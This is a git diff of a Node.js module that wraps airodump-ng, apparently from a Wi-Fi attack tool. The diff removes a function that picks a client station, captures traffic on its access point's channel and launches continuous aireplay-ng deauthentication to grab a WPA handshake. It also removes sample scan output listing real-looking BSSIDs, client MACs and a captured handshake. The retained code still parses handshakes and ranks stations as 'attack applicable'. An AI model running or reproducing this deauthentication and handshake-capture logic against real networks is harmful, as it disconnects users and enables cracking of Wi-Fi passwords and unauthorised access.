@@ -6,39 +6,6 @@ const EventEmitter = require('events').EventEmitter;
 
 const IFace = require('./interface');
 const aireplay = require('./aireplay-ng');
-const ctrls = require('./controls');
-
-/*
-
-CH 13 ][ Elapsed: 3 mins ][ 2016-11-16 20:46
-
-BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
-
-A0:F3:C1:EF:CE:30  -54      231       14    0   1  54e. OPN              South Gargoyle
-54:04:A6:5B:19:30  -64      454       52    0   3  54e  WPA2 TKIP   PSK  North Gargoyle
-
-BSSID              STATION            PWR   Rate    Lost    Frames  Probe
-
-A0:F3:C1:EF:CE:30  74:2F:68:B6:85:88  -47    0e- 0e     0       18
-54:04:A6:5B:19:30  60:FE:1E:49:87:C3  -51   24e- 1      0       66
-
-*/
-
-/*
-
-CH 14 ][ Elapsed: 1 min ][ 2016-11-16 21:28 ][ WPA handshake: 54:04:A6:5B:19:30
-
-BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
-
-A0:F3:C1:EF:CE:30  -56      125        6    0   1  54e. OPN              South Gargoyle
-54:04:A6:5B:19:30  -70      218       28    0   3  54e  WPA2 TKIP   PSK  North Gargoyle
-
-BSSID              STATION            PWR   Rate    Lost    Frames  Probe
-
-54:04:A6:5B:19:30  60:FE:1E:49:87:C3  -42   24e- 1      0       14
-54:04:A6:5B:19:30  74:2F:68:B6:85:88  -55   54e- 1e     0       31
-
-*/
 
 function parse(str) {
 
@@ -47,9 +14,7 @@ function parse(str) {
     'BSSID STATION PWR Rate Lost Frames Probe'
   ];
 
-  let result = {
-    handshake: null
-  },
+  let result = {},
     headLine = '',
     headChunks = [],
     headPrefix;
@@ -62,9 +27,10 @@ function parse(str) {
 
     if (lines[i].match(/Elapsed/)) {
       let chunks = lines[i].split('][');
-      if (chunks[chunks.length - 1].match(/handshake/)) {
-        const handsh = chunks[chunks.length - 1].match(/([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})/);
-        result.handshake = handsh && handsh[0] || result.handshake;
+      const lastIndex = chunks.length - 1;
+      const handshakeIndex = chunks[lastIndex].indexOf('handshake');
+      if (~handshakeIndex) {
+        result.handshake = chunks[lastIndex].substr(handshakeIndex + 10).trim();
       }
       continue;
     }
@@ -113,7 +79,6 @@ class Data {
     this.aps = aps;
     this.stations = stations;
 
-    this.currentStationNum = 0;
     this.items = this.getAttackApplicable();
   }
   getAttackApplicable() {
@@ -150,30 +115,7 @@ class Data {
 
     return applicable;
   }
-  moveUpCurrent() {
-    let len;
-    if (Data.currentStationNum) {
-      Data.currentStationNum--;
-    } else {
-      len = Object.keys(this.items).length;
-      Data.currentStationNum =  len > 0 ? len - 1 : 0;
-    }
-  }
-  moveDownCurrent() {
-    if (Data.currentStationNum < Object.keys(this.items).length) {
-      Data.currentStationNum++;
-    } else {
-      Data.currentStationNum = 0;
-    }
 
-    //console.log('current: ', Data.currentStationNum);
-
-    //process.exit();
-
-  }
-  getCurrentNum() {
-    return Data.currentStationNum;
-  }
   getCurrentStation() {
     const num = this.getCurrentNum();
     let station = {};
@@ -184,15 +126,9 @@ class Data {
         station['MAC'] = mac;
       }
     });
-
-
-
     return station;
   }
 }
-
-Data.currentStationNum = 0;
-
 
 const self = new EventEmitter();
 
@@ -203,6 +139,8 @@ self.run = (iface, ...options) => {
 
   self.iface = iface || self.iface;
 
+  self.stop();
+
   let params = [...options, self.iface.toString()];
 
   const proc = self.proc = spawn('airodump-ng', params);
@@ -211,7 +149,7 @@ self.run = (iface, ...options) => {
 
     proc.on('error', (err) => reject(err));
 
-    proc.on('close', (code) => console.log(`Child process exited with code ${code}`));
+    //proc.on('close', (code) => console.log(`Child process exited with code ${code}`));
     //proc.stdout.on('data', (data) => console.log(data.toString('UTF-8'))); // ???
 
     // airodump-ng dumps data into stderr, not stdout
@@ -227,86 +165,13 @@ self.run = (iface, ...options) => {
 
 };
 
-self.quit = () => {
+self.stop = () => {
   self.proc && self.proc.stdin.pause() && self.proc.kill();
-};
-
-/*
-self.on('data', (data) => {
-  self.stations = Object.keys(data.getAttackApplicable());
-});
-*/
-
-self.attack = () => {
-
-  const station = self.data.getCurrentStation();
-  let handshake = null;
-
-  if (!Object.keys(station).length) {
-    return;
-  }
-
-  //console.log(station);
-
-  self.quit();
-
-  /*
-   {
-   BSSID: '54:04:A6:5B:19:30',
-   'STATION-PWR': '-1',
-   Frames: '1',
-   'AP-PWR': '-60',
-   '#Data': '0',
-   Beacons: '63',
-   CH: '3',
-   ENC: 'WPA2',
-   CIPHER: 'TKIP',
-   AUTH: 'PSK',
-   ESSID: 'North',
-   MAC: '74:2F:68:B6:85:88'
-   }
-   */
-
-  //return airodump.run(iface, '--bssid', '54:04:A6:5B:19:30', /*'-w', 'psk',*/ '-c', '3');
-
-  return self.run(null,
-    '--bssid', station.BSSID,
-    '-w', station.ESSID,
-    '-c', station.CH
-  ).then((airodump) => {
-
-    airodump.on('data', data => {
-      handshake = data.handshake || handshake;
-    });
-
-    // aireplay-ng --deauth 10 -a 64:66:B3:45:C7:F4 -c DC:85:DE:3A:53:BD  mon0
-    return aireplay.run(self.iface,
-      '--deauth', '0',
-      '-a', station.BSSID,
-      '-c', station.MAC
-    );
-  }).then((aireplay) => aireplay.on('data', (item) => {
-
-    //console.log(item);
-
-    ctrls.render([
-      {'handshake:': handshake ? 'yes!!!' :'no'},
-      {'ESSID:': station.ESSID},
-      {'BSSID:': station.BSSID},
-      {'STATION:': station.MAC},
-      {'CHANNEL:': station.CH},
-      {'STATUS:': item.STATUS},
-      {'ACKs:': item.ACKs}
-    ], [
-      `    b = back   q = quit`,
-    ]);
-  }));
-
 };
 
 self.moveUpStation = () => self.data.moveUpCurrent();
 self.moveDownStation = () => self.data.moveDownCurrent();
 
-process.on('exit', () => self.quit());
+process.on('exit', () => self.stop());
 
 module.exports = self;
